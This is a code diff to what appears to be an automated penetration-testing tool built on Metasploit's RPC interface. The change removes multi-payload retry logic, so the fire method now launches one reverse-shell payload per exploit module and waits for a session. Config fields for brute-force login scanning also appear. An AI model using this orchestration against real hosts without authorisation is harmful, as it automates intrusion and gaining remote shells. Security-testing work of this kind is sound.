@@ -186,11 +186,6 @@ class MsfConfig:
     username: str = "msf"
     aux_timeout: int = 120           # per-module cap for auxiliary/unauth runs
     exploit_timeout: int = 90
-    # How many compatible payloads to try per exploit before giving up. The first
-    # is the best pick; on a clean no_session the next is tried, since a target may
-    # execute the module but be unable to run that payload (for example bash with no
-    # /dev/tcp). 1 disables fallback.
-    payload_retries: int = 4
     brute_timeout: int = 600        # per-service login scanner cap
     brute_threads: int = 8          # parallel attempts within one login scanner
     cred_user: str = ""             # default USERNAME for credentialed exploits
@@ -520,16 +515,11 @@ class MsfClient:
         return data
 
     def fire(self, candidate, host, rhost, port):
-        """Detonate the module against rhost, trying compatible payloads in
-        reliability order until one calls back. Returns (session, status, detail).
-        status is one of:
+        """Detonate the module against rhost with a single selected reverse payload.
+        Returns (session, status, detail). status is one of:
           session    - a session opened
-          no_session - the module fired for every payload tried (execute accepted)
-                       but nothing called back within the timeout. The only clean
-                       negative. A target may execute the module yet be unable to
-                       run a given payload (bash with no /dev/tcp, missing perl),
-                       so up to cfg.payload_retries payloads are tried before this
-                       is returned.
+          no_session - the module fired (execute was accepted) but nothing called
+                       back within the timeout. This is the only clean negative.
           blocked    - no fair attempt was made: an option we needed was unset or
                        rejected, no compatible payload, no derivable LHOST, the
                        LPORT pool was empty, or MSF refused to run the module.
@@ -537,45 +527,20 @@ class MsfClient:
         Only no_session means the target got a real attempt and did not yield;
         every other non-session status flags a tooling gap to review, so a real
         flaw is never buried under a generic failure. detail carries the reason.
-        Each attempt stops its own handler job and frees its LPORT in teardown."""
-        try:
-            modref = _strip_type(candidate.module)
-            exploit = self._client.modules.use("exploit", modref)
-            payloads = _select_payloads(exploit, candidate.module, host)
-        except Exception as e:
-            logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
-            return None, "error", f"fire error: {e}"
-        if not payloads:
-            return self._blocked(candidate, rhost, "no compatible payload")
-        cap = max(1, getattr(self.cfg, "payload_retries", 4))
-        attempts = payloads[:cap]
-        last = (None, "no_session", "fired, no session within timeout")
-        for i, payload_name in enumerate(attempts):
-            session, status, detail = self._fire_once(
-                candidate, host, rhost, port, exploit, payload_name)
-            if status == "session":
-                return session, status, detail
-            if status == "blocked":
-                # option/setup gap; a different payload will not help. Stop here.
-                return session, status, detail
-            # no_session or error: try the next payload if any remain
-            last = (session, status, detail)
-            if status == "no_session" and i + 1 < len(attempts):
-                nxt = attempts[i + 1]
-                logger.info("fire %s @ %s: %s did not call back, retrying with %s",
-                            candidate.module, rhost, payload_name, nxt)
-        return last
-
-    def _fire_once(self, candidate, host, rhost, port, exploit, payload_name):
-        """One fire attempt with a specific payload. Acquires and releases its own
-        LPORT and stops its own handler job. Returns the same (session, status,
-        detail) contract as fire. Separated so fire can retry across payloads
-        without re-resolving the exploit or leaking ports and jobs between tries."""
+        One payload is tried per fire: the best pick from _select_payload, ordered
+        for reliability (interpreter and native shells first, meterpreter last).
+        The handler job is always stopped in teardown, which frees the LPORT and
+        leaves any session intact."""
         lport = self._lport_acquire()
         if lport is None:
             return self._blocked(candidate, rhost, "LPORT pool exhausted")
         job_id = None
         try:
+            modref = _strip_type(candidate.module)
+            exploit = self._client.modules.use("exploit", modref)
+            payload_name = _select_payload(exploit, candidate.module, host)
+            if payload_name is None:
+                return self._blocked(candidate, rhost, "no compatible payload")
             payload = self._client.modules.use("payload", payload_name)
             lhost = self.cfg.lhost or _lhost_for(rhost)
             if not lhost:
@@ -637,8 +602,7 @@ class MsfClient:
             job_id = result.get("job_id")
             matched = self._await_session(uuid, self.cfg.exploit_timeout)
             if matched is None:
-                logger.info("fire %s @ %s payload=%s -> no session",
-                            candidate.module, rhost, payload_name)
+                logger.info("fire %s @ %s -> no session", candidate.module, rhost)
                 return None, "no_session", "fired, no session within timeout"
             sid, sdict = matched
             logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
